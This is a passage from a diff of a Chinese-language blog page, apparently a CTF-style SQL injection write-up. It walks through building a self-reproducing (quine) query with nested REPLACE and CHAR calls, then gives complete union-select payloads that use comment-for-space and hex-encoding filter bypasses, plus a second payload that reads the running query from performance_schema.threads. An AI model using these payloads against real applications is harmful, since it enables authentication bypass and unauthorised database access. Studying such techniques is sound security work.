+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&#x27;REPLACE(&quot;B&quot;,&quot;B&quot;,&quot;B&quot;)&#x27;,B,&#x27;REPLACE(&quot;B&quot;,&quot;B&quot;,&quot;B&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
+<p>他经过处理后会变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&quot;REPLACE(&quot;B&quot;,&quot;B&quot;,&quot;B&quot;)&quot;,&quot;REPLACE(&quot;B&quot;,&quot;B&quot;,&quot;B&quot;)&quot;,&quot;REPLACE(&quot;B&quot;,&quot;B&quot;,&quot;B&quot;)&quot;)</span><br></pre></td></tr></table></figure>
+<p>仅相差中间那个B</p>
+<p>此时利用<code>char(66)</code>，其实就是<code>B</code>，但是它不会被替换</p>
+<p>此时变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&#x27;REPLACE(&quot;B&quot;,CHAR(66),&quot;B&quot;)&#x27;,CHAR(66),&#x27;REPLACE(&quot;B&quot;,CHAR(66),&quot;B&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
+<p>最后变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&quot;REPLACE(&quot;B&quot;,CHAR(66),&quot;B&quot;)&quot;,CHAR(66),&quot;REPLACE(&quot;B&quot;,CHAR(66),&quot;B&quot;)&quot;)</span><br></pre></td></tr></table></figure>
+<p>但是此时又有了个新的问题，此时看到距离我们的最终目标就剩下了<code>单双引号</code></p>
+<p>那我们再次利用replace将单引号换成双引号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(REPLACE(&#x27;REPLACE(REPLACE(&quot;B&quot;,CHAR(34),CHAR(39)),CHAR(66),&quot;B&quot;)&#x27;,CHAR(34),CHAR(39)),CHAR(66),&#x27;REPLACE(REPLACE(&quot;B&quot;,CHAR(34),CHAR(39)),CHAR(66),&quot;B&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
+<p>比较套娃</p>
+<p>此处实际上执行了两次replace：</p>
+<p>第一次：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&#x27;REPLACE(REPLACE(&quot;B&quot;,CHAR(34),CHAR(39)),CHAR(66),&quot;B&quot;)&#x27;,CHAR(34),CHAR(39))</span><br></pre></td></tr></table></figure>
+<p>此处将该语句的双引号都换成了单引号</p>
+<p>此时变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&#x27;REPLACE(REPLACE(&#x27;B&#x27;,CHAR(34),CHAR(39)),CHAR(66),&#x27;B&#x27;)&#x27;,CHAR(66),&#x27;REPLACE(REPLACE(&quot;B&quot;,CHAR(34),CHAR(39)),CHAR(66),&quot;B&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
+<p>最后的输出结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(REPLACE(&#x27;REPLACE(REPLACE(&quot;B&quot;,CHAR(34),CHAR(39)),CHAR(66),&quot;B&quot;)&#x27;,CHAR(34),CHAR(39)),CHAR(66),&#x27;REPLACE(REPLACE(&quot;B&quot;,CHAR(34),CHAR(39)),CHAR(66),&quot;B&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
+<p>此时和语句1一致了</p>
+<p>最后考虑到需要添加<code>union select 空格/**/ 井号</code></p>
+<p>最后的payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/REPLACE(REPLACE(&#x27;1&quot;/**/union/**/select/**/REPLACE(REPLACE(&quot;B&quot;,CHAR(34),CHAR(39)),CHAR(66),&quot;B&quot;)#&#x27;,CHAR(34),CHAR(39)),CHAR(66),&#x27;1&quot;/**/union/**/select/**/REPLACE(REPLACE(&quot;B&quot;,CHAR(34),CHAR(39)),CHAR(66),&quot;B&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>
+<p>如果char被过滤，还可以利用十六进制编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/REPLACE(REPLACE(&#x27;&quot;/**/union/**/select/**/REPLACE(REPLACE(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;,0x22,0x27),0x25,&#x27;&quot;/**/union/**/select/**/REPLACE(REPLACE(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>
+<p>方法2：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;union/**/select/**/mid(`11`,65,217)/**/from(select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,1</span><br><span class="line">4,15,16,17/**/union/**/select/**/*/**/from/**/performance_schema.threads/**/where/**/na</span><br><span class="line">me/**/like&#x27;%connection%&#x27;/**/limit/**/1,1)t#</span><br></pre></td></tr></table></figure>
 <hr>
 <p>参考资料：</p>
 <ul>
@@ -561,7 +981,7 @@
                     <a class="tag-none-link" href="/tags/SQL-Injection/" rel="tag">SQL_Injection</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2023-03-12T09:43:56.845Z" itemprop="dateModified">最后编辑：2023-03-12</time>
+                    <time datetime="2023-11-12T06:28:18.316Z" itemprop="dateModified">最后编辑：2023-11-12</time>
                 </div>
             </div>
         </footer>
